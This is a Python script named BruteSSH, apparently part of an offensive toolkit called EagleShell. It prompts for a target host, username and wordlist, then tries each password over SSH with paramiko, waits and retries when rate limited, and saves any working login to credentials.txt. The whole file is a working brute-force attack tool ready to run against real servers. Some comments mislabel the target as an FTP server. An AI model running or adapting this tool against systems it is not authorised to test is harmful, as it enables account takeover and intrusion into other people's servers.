#!/usr/bin/python3

# BruteSSH - SSH Brute Force Script

# Imports all needed variables and packages
from assets.banners import brutessh_banner
from assets.designs import *
from assets.properties import clear_screen
from assets.redirect import redirect_eagleshell_brute_force
import os
import paramiko
import socket
import time


# Main Function
def brutessh_main():

    # Function that sets all
    def set_all():
        global password_found
        global password_tried
        global host_set
        global user_set
        global wordlist_set
        host_set = ''
        user_set = ''
        wordlist_set = ''
        password_found = ''
        password_tried = 0
        configuration()

    # Function that takes some user input
    def configuration():
        try:
            global host_set
            global user_set
            global wordlist_set
            os.system(clear_screen)
            print(logo)
            print('')
            print(line)
            print(brutessh_banner)
            print(line)
            print('')
            print(author)
            print('Configuration:')
            print('')
            # hostname or IP address of the FTP server
            print('\tHost Input')
            print('\tExample: 10.10.10.15')
            print('')
            # username of the FTP server, root as default for linux
            print('\tUser Input:')
            print('\tExample: admin')
            print('')
            # wordlist to use
            print('\tWordlist Input')
            print('\tExample: /opt/EagleShell/wordlists/default-credentials/ssh-default-cedentials.txt')
            print('')
            print('\tZ): Back')
            print('\tX): Exit')
            print('')
            while True:
                host_set = input('\u001b[33mHOST \u001b[37m> ').lower()
                if host_set == 'z':
                    redirect_eagleshell_brute_force()
                elif host_set == 'x':
                    exit_shell()
                user_set = input('\u001b[33mUSER \u001b[37m> ')
                if user_set == 'z' or user_set == 'Z':
                    redirect_eagleshell_brute_force()
                elif user_set == 'x' or user_set == 'Z':
                    exit_shell()
                wordlist_set = input('\u001b[33mWORDLIST \u001b[37m> ')
                if wordlist_set == 'z' or wordlist_set == 'Z':
                    redirect_eagleshell_brute_force()
                elif wordlist_set == 'x' or wordlist_set == 'X':
                    exit_shell()
                process()
        except KeyboardInterrupt:
            exit_shell()
        except FileNotFoundError:
            print('\u001b[31m[-] Unable To Connect.')
            os.system('sleep 1')
            brutessh_main()

    # Function that displays before bruteforce
    def process():
        os.system(clear_screen)
        print(logo)
        print('')
        print(line)
        print(brutessh_banner)
        print(line)
        print('')
        print(author)
        print('Process:')
        print('')
        print('\tStatus')
        print('\t------')
        print('')
        print('\tStop: CTRL+C')
        print('')
        set_ready()
        result()

    # Function that brute forces
    def is_ssh_open(hostname, username, password):
        global password_tried
        global password_found
        # initialize SSH client
        client = paramiko.SSHClient()
        # add to know hosts
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(hostname=hostname, username=username, password=password, timeout=3)
        except socket.timeout:
            # this is when host is unreachable
            print("\t\u001b[31m[!] Host: " + hostname + " is unreachable, timed out.")
            return False
        except paramiko.AuthenticationException:
            print("\t\u001b[31m[!] Invalid credentials for " + username + ":" + password)
            password_tried = password_tried + 1
            return False
        except paramiko.SSHException:
            print("\t\u001b[36;1m[*] Quota exceeded, retrying with delay...")
            # sleep for a minute
            time.sleep(60)
            return is_ssh_open(hostname, username, password)
        except KeyboardInterrupt:
            result()
        else:
            # connection was established successfully
            password_found = password
            result()

    # Function that does the process
    def set_ready():
        # read the file
        passwords = open(wordlist_set).read().split("\n")
        # brute-force
        for password in passwords:
            if is_ssh_open(host_set, user_set, password):
                # if combo is valid, save it to a file
                open("credentials.txt", "w").write(f"{user_set}@{host_set}:{password}")
                break

    # Function that displays result
    def result():
        try:
            os.system(clear_screen)
            print(logo)
            print('')
            print(line)
            print(brutessh_banner)
            print(line)
            print('')
            print(author)
            print('Result:')
            print('')
            if len(password_found) > 1:
                print('\tHOST: \u001b[32;1m' + host_set + '\u001b[37m')
                print('')
                print('\tUSERNAME: \u001b[32;1m' + user_set + '\u001b[37m')
                print('')
                print('\tPASSWORD: \u001b[32;1m' + password_found + '\u001b[37m')
                print('')
                print('\tWORDLIST: \u001b[32;1m' + wordlist_set + '\u001b[37m')
            else:
                print('\t\u001b[37mHOST: \u001b[31m' + host_set + '\u001b[37m')
                print('')
                print('\t\u001b[37mUSERNAME: \u001b[31m' + user_set + '\u001b[37m')
                print('')
                print('\t\u001b[37mPASSWORD: \u001b[31mNot Found.\u001b[37m')
                print('')
                print('\t\u001b[37mWORDLIST: \u001b[31m' + wordlist_set + '\u001b[37m')
            print('')
            if len(password_found) > 1:
                print('\tPASSWORDS TRIED: \u001b[32;1m' + str(password_tried) + '\u001b[37m')
            else:
                print('\tPASSWORDS TRIED: \u001b[31m' + str(password_tried) + '\u001b[37m')
            print('')
            print('\tX): Exit')
            print('')
            while True:
                eagleshell_cmd = input('\u001b[33mEagleShell \u001b[37m> ').lower()
                if eagleshell_cmd == 'x':
                    exit_shell()
                else:
                    print('\u001b[31m[-] Invalid Input.')
                    continue
        except KeyboardInterrupt:
            exit_shell()

    # The function where you exit
    def exit_shell():
        print('\n\u001b[31m[-] Exiting EagleShell')
        print('\u001b[0m')
        os.system('sleep 2')
        os.system(clear_screen)
        exit()

    set_all()


brutessh_main()
